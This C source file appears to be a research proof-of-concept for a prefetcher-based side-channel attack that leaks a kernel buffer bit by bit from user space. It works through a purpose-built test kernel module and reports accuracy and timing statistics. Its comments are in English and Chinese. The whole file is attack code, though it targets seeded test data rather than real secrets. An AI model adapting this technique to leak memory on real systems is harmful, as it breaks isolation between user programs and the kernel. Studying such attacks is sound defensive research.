#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <time.h>

#include "common.h"

// file descriptor of kernel module
static int module_fd;

// colliding load instruction
static load_gadget_f gadget;

// colliding buffer
static uint8_t* colliding_buffer;

// threshold to distinguish cache hit from cache miss
static uint64_t threshold;

// 尝试泄露单个比特的函数
uint64_t leak_bit(size_t offset, size_t stride) {

    // 刷新上次访问的缓冲区位置和探测位置，确保它们不在缓存中
    flush(colliding_buffer + 2 * stride); 
    flush(colliding_buffer + 3 * stride); 
    mfence();

    // access in kernel to kernel_buffer to if secret at index we want to leak is one
    ioctl(module_fd, CMD_GADGET_CF, offset);
    mfence();
   
    // more accesses in userspace.
    // if offset is guessed correctly, this follows the stride and will prefetch.
    // otherwise, this will not prefetch.
    gadget(colliding_buffer + 1 * stride);
    mfence();
    gadget(colliding_buffer + 2 * stride);
    mfence();

    // faset access time -> was prefetched -> kernel_buffer was accessed -> secret bit is 1
    return probe(colliding_buffer + 3 * stride) < threshold;
}

// 获取纳秒级时间的辅助函数
static uint64_t get_time_nanos() {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t); // 获取单调时钟时间
    return t.tv_sec * 1000000000ull + t.tv_nsec;    // 转换为纳秒
}

// 泄露单个字节的函数
static uint8_t leak_byte(size_t offset) {
    uint8_t byte = 0;
    for(int bit = 0; bit < 8; bit ++) {
        // 循环8次，每次泄露一个比特
        // offset * 8 + bit：计算当前要泄露的比特在整个秘密数据中的偏移量
        // (rand64() % 2048) + 512：生成一个随机的步幅，用于避免缓存的固定模式，增加攻击的随机性
        byte |= leak_bit(offset * 8 + bit, (rand64() % 2048) + 512) << bit; // 将泄露的比特按位或到byte中
    }
    return byte;
}

// 分析泄露结果的函数，计算正确率、误报和漏报
static void analyze_leakage(uint8_t reference, uint8_t observed, uint32_t* correct, uint32_t* false_positives, uint32_t* false_negatives, uint32_t* positives, uint32_t* negatives) {
    for(uint32_t i = 0; i < 8; i++) {
        uint32_t mask = 1 << i;
        
        if(reference & mask){
            *positives += 1;
        } else {
            *negatives += 1;
        }
        
        if((reference ^ observed) & mask) {
            if(observed & mask) {
                // false positive
                *false_positives += 1;
            } else {
                // false neagative
                *false_negatives += 1;
            }
        } else {
            // correct
            *correct += 1;
        }
    }
}

int main(int argc, char** argv) {
    // 打开内核模块设备文件
    module_fd = open(FETCHPROBE_MODULE_DEVICE_PATH, O_RDONLY);

    if(module_fd < 0) {
        fputs("failed to open kernel module!\n", stderr);
        return -1;
    }
    
    // 从内核获取必要的信息（如内核缓冲区地址和内核加载指令地址）
    struct fetchprobe_kernel_info info;
    ioctl(module_fd, CMD_INFO, &info);
    printf("kernel buffer: 0x%016zx\nkernel load: 0x%016zx\n", info.kernel_buffer, info.kernel_access_cf);
    
    // 映射与内核缓冲区发生冲突的缓冲区。
    // map_gadget将内核的加载指令映射到用户空间可执行的地址。
    gadget = map_gadget(info.kernel_access_cf & 0x7fffffffffffull);
    // map_buffer映射一个用户空间缓冲区，其物理地址可能与内核缓冲区重叠。
    // (info.kernel_buffer & 0x7fffffffffffull) - PAGE_SIZE * 2：根据内核缓冲区地址计算冲突缓冲区的起始地址。
    // PAGE_SIZE * 5：映射的缓冲区大小。
    // + PAGE_SIZE * 2：可能是为了调整到合适的偏移量，使得与内核缓冲区重叠。
    colliding_buffer = map_buffer((info.kernel_buffer & 0x7fffffffffffull) - PAGE_SIZE * 2, PAGE_SIZE * 5) + PAGE_SIZE * 2;
    printf("colliding buffer: 0x%016zx\ncolliding load: 0x%016zx\n", (uintptr_t)colliding_buffer, (uintptr_t)gadget);
    
    // 计算区分缓存命中和未命中的阈值
    threshold = calculate_threshold();
    printf("threshold: %zu\n", threshold);
    
    // 使用时间戳作为随机数生成器的初始种子
    uint64_t shared_seed = _rdtsc();
    
    // 使用伪随机数据初始化内核缓冲区
    ioctl(module_fd, CMD_RESET, shared_seed);
   
    // 泄露整个缓冲区的数据
    // bitvector for accesses (0 = no access detected, 1 = access detected)
    uint8_t leakage[BUFFER_SIZE] = {0}; // 用于存储泄露结果的数组
    mfence();
    uint64_t start = get_time_nanos();  // 开始计时
    mfence();
    for(int offset = 0; offset < BUFFER_SIZE; offset ++) {
        leakage[offset] = leak_byte(offset);    // 逐字节泄露
    }
    mfence();
    uint64_t end = get_time_nanos();    // 结束计时
    mfence();
    printf("time: %zu\n", end - start); // 打印泄露所需时间
    
    // 检查泄露的准确性
    seed = shared_seed; // 重新设置随机数种子，以便生成与内核缓冲区初始化时相同的随机数据作为参考
    uint32_t correct = 0;
    uint32_t false_positives = 0;
    uint32_t false_negatives = 0;
    uint32_t positives = 0;
    uint32_t negatives = 0;
    for(int i = 0; i < BUFFER_SIZE; i++) {
        // analyze_leakage((uint8_t)(rand64() % 256), leakage[i], ...): 生成与内核中一致的随机参考数据
        analyze_leakage((uint8_t)(rand64() % 256), leakage[i], &correct, &false_positives, &false_negatives, &positives, &negatives);
    }
    printf("correct: %u\n", correct);
    printf("positives: %u\n", positives);
    printf("negatives: %u\n", negatives);
    printf("false positives: %u\n", false_positives);
    printf("false negatives: %u\n", false_negatives);
    
    // no need to unmap, etc. OS will take care of that for us :)
    // 无需手动解除映射等操作，操作系统会在程序退出时自动处理
}	

